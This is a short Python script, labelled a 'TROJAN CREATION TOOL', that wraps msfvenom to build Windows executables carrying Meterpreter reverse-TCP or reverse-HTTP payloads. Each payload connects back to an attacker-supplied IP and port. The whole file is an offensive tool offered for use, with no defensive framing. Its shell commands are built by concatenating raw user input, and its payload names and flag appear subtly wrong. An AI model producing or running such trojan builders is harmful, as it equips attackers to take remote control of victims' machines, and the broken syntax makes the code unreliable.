import os

os.system("apt-get install figlet")
os.system("figlet TOA")
os.system("clear")
print("!!!TROJAN CREATION TOOL!!!")

# get local or external IP
ip = input("Enter Local or External IP: ")
port = input("Enter Port: ")

print("1: windows/meterpreter/reverse-tcp")
print("2: windows/meterpreter/reverse-http")
payload = input("Enter Payload Number: ")
output_file = input("Enter Output File Path: ")

# create trojan with specified payload and options
if(payload == "1"):
    os.system("msfvenom -P windows/meterpreter/reverse-tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + output_file)
elif(payload == "2"):
    os.system("msfvenom -P windows/meterpreter/reverse-http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + output_file)
